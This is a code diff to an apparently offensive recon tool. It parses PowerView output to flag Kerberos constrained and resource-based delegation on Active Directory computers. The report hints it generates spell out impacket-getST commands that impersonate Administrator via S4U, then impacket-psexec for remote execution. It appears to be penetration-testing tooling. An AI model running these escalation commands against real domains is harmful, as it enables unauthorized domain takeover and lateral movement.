@@ -7942,6 +7942,112 @@ def _multiline_passes(path, report, store):
                                        source=path, line=_ln(_um),
                                        meta={"is_dc": _is_dc}))
 
+    # iter-282: PowerView `Get-DomainComputer -TrustedToAuth | fl`
+    # output - Constrained Delegation (KCD) + Resource-Based Constrained
+    # Delegation (RBCD) block detection. Complements iter-279 which
+    # handles unconstrained.
+    #
+    # Attack shape A (KCD): TRUSTED_TO_AUTH_FOR_DELEGATION on the source
+    # computer + msds-allowedtodelegateto populated with SPN list. If we
+    # own the SOURCE computer's key material, S4U2Self+S4U2Proxy lets us
+    # request TGS for ANY user against those listed SPNs.
+    #   samaccountname               : SQL01$
+    #   useraccountcontrol           : ..., TRUSTED_TO_AUTH_FOR_DELEGATION
+    #   msds-allowedtodelegateto     : {MSSQLSvc/DB01:1433, CIFS/DB01}
+    #
+    # Attack shape B (RBCD): msds-allowedtoactonbehalfofotheridentity
+    # populated. If we control the SID referenced there, we can request
+    # tickets AS ANY user targeting this computer.
+    #   samaccountname                              : WEB01$
+    #   msds-allowedtoactonbehalfofotheridentity    : System.Security...
+    # Negative-lookahead intermediate span `(?!^samaccountname)[\s\S]`
+    # prevents crossing another samaccountname line - the standard
+    # "one span, one block" pattern that avoids finditer's greedy-first-
+    # match consuming multiple blocks then failing the bleed guard.
+    _PV_KCD = re.compile(
+        r'(?im)^samaccountname\s*:\s*([\w.\-$]{1,60}\$)\s*[\r\n]+'
+        r'(?:(?!^samaccountname\s*:)[\s\S]){0,800}?'
+        r'^msds-allowedtodelegateto\s*:\s*\{?([^\r\n]{5,600}?)\}?\s*$')
+    _PV_RBCD = re.compile(
+        r'(?im)^samaccountname\s*:\s*([\w.\-$]{1,60}\$)\s*[\r\n]+'
+        r'(?:(?!^samaccountname\s*:)[\s\S]){0,800}?'
+        r'^msds-allowedtoactonbehalfofotheridentity\s*:\s*'
+        r'([^\r\n]{5,600})')
+    _PV_DELEG_BLEED = re.compile(r'(?im)^samaccountname\s*:')
+    if not filters.is_doc_file(path):
+        _kcd_seen = set()
+        for _km in _PV_KCD.finditer(text):
+            # negative-lookahead intermediate span already prevents
+            # crossing samaccountname boundary; no post-hoc bleed check
+            # needed.
+            _src = _km.group(1).strip()
+            _spns = _km.group(2).strip()
+            _sig = _src.lower()
+            if _sig in _kcd_seen:
+                continue
+            _kcd_seen.add(_sig)
+            # Elevate severity when any SPN points at a DC
+            # (CIFS/dcname, ldap/dcname, host/dcname on DC hostname).
+            _dc_hint = ""
+            if re.search(r'(?i)\b(cifs|host|ldap|krbtgt)/[\w.\-]*dc\d*',
+                          _spns):
+                _sev = "CRITICAL"
+                _dc_hint = " (DC SPN in target list - DA path via S4U)"
+            else:
+                _sev = "HIGH"
+            _src_sh = _src.replace("'", "'\\''")
+            report.add(_sev, "RECON", path, _ln(_km),
+                       f"KCD constrained delegation on {_src}{_dc_hint}"
+                       f" - allowed SPNs: {_spns[:80]}",
+                       hint=(f"if we hold {_src_sh}'s NT hash: impacket-"
+                             f"getST -impersonate Administrator -spn "
+                             f"<one-of-listed-SPNs> "
+                             f"'{{_dom}}/{_src_sh}' -hashes :<NT>  |  "
+                             f"S4U2Self requests self-TGS, S4U2Proxy "
+                             f"forwards it to any listed SPN as any "
+                             f"user - even Administrator, since the "
+                             f"target SPN doesn't validate the "
+                             f"impersonated user's privileges"))
+            if store is not None:
+                store.add(Evidence(kind="host", host=_src,
+                                   fact="kcd",
+                                   source=path, line=_ln(_km),
+                                   meta={"allowed_spns": _spns[:400]}))
+        _rbcd_seen = set()
+        for _rm in _PV_RBCD.finditer(text):
+            _tgt = _rm.group(1).strip()
+            _val = _rm.group(2).strip()
+            # Skip when the attribute has no value ({} / empty string).
+            if not _val or _val in ("{}", "null", "System.Security."
+                                     "AccessControl.RawSecurityDescriptor"):
+                # Bare object-type header without a decoded SID is
+                # not useful; the operator would have to run
+                # PowerView's Get-DomainRBCD to expand it.
+                pass  # still flag; the presence of the attribute is
+                      # itself the finding
+            _sig = _tgt.lower()
+            if _sig in _rbcd_seen:
+                continue
+            _rbcd_seen.add(_sig)
+            _tgt_sh = _tgt.replace("'", "'\\''")
+            report.add("CRITICAL", "RECON", path, _ln(_rm),
+                       f"RBCD (Resource-Based Constrained Delegation) "
+                       f"on {_tgt} - impersonate any user to this "
+                       f"host if we control the SID",
+                       hint=(f"expand SID: PowerView Get-DomainRBCD "
+                             f"-Identity {_tgt_sh}  |  if we control "
+                             f"the referenced principal: impacket-"
+                             f"getST -impersonate Administrator -spn "
+                             f"CIFS/{_tgt_sh} '<dom>/<our-principal>'"
+                             f" -hashes :<NT>  |  then export "
+                             f"KRB5CCNAME + impacket-psexec -k -no-pass"
+                             f" '{_tgt_sh}'"))
+            if store is not None:
+                store.add(Evidence(kind="host", host=_tgt,
+                                   fact="rbcd_target",
+                                   source=path, line=_ln(_rm),
+                                   meta={"raw_value": _val[:400]}))
+
     # iter-271: NetExec / crackmapexec (Pwn3d!) marker. When a service
     # scan line ends with `(Pwn3d!)`, that user is LOCAL ADMIN on that
     # host. credline.py captures the cred pair itself but doesn't
